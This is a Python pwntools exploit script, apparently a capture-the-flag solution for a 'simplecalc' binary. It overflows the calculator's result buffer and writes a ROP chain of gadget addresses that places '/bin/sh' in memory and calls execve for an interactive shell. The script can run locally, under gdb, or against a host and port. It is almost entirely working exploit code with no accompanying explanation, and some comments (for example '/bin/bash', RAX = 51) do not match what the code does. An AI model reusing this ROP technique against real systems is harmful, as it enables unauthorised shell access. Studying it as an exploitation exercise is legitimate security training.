#!/usr/bin/env python

from pwn import *
import sys

def EAT(target):
    print(target.recvuntil("=>"))
def add(target, value):
    first = value - 100
    second = 100
    target.sendline('1')
    target.sendline(str(first))
    target.sendline(str(second))
    EAT(target)
def clean(target):
    target.sendline('2')
    target.sendline('100')
    target.sendline('100')
    EAT(target)
def main(argv):
    executable="./simplecalc"
    if len(argv) < 2:
        print("Usage: "+str(argv[0]) +' <d> debug; <r> remote; <l> local')
        return
    if (argv[1] == 'd'):
        log.info("Debug")
        target = gdb.debug(executable,'''
            gef restore
            tmux-setup
            b *0x00401589
            continue
            ''')
    elif (argv[1] == 'r'):
        log.info("Remote target")
        target=remote("127.0.0.1","31337")
    else:
        target=process(executable)

    calcs = 100
    target.recvline()
    target.sendline(str(calcs))
    i = 0
    EAT(target)
    second = 100
    while i < 15 + 3:
        target.sendline('2')
        target.sendline('100')
        target.sendline('100')
        EAT(target)
        i+=1
    log.info("Creating ROPCHAIN")
    base = 0x400360
    SYSCALL = 0x00064585 + base
    # RAX = 51; RDI = pointer to "/bin/bash"; RSI=RDX=0x0
    # write "/bin/bash" to "0x00000000006c0000"
    # 0x00044f0e : mov [rax], rdx; ret
    mov_prax_rdx = 0x44f0e + base 
    # 0x0004d7d4 : pop rax; ret
    pop_rax = 0x4d7d4  + base
    # 0x00037725 : pop rdx; ret
    pop_rdx = 0x00037725 + base
    # 0x00001813 : pop rdi; ret
    pop_rdi = 0x00001813 + base
    pop_rsi= 0x00001927 + base #: pop rsi; ret
    add(target, pop_rdx)
    clean(target)
    add(target, 0x6e69622f)
    add(target, 0x0068732f)
    add(target, pop_rax)
    clean(target)
    add(target, 0x6c0100)
    clean(target)
    add(target, mov_prax_rdx)
    clean(target)
    
    add(target, pop_rdi)
    clean(target)
    add(target, 0x6c0100)
    clean(target)

    add(target, pop_rsi)
    clean(target)
    clean(target)
    clean(target)
    add(target, pop_rdx)
    clean(target)
    clean(target)
    clean(target)
    add(target, pop_rax)
    clean(target)
    add(target, 59)
    clean(target)
    add(target,SYSCALL)
    clean(target)
    target.sendline('5')
        
    target.interactive()
    return

if __name__ == "__main__":
    main(sys.argv)
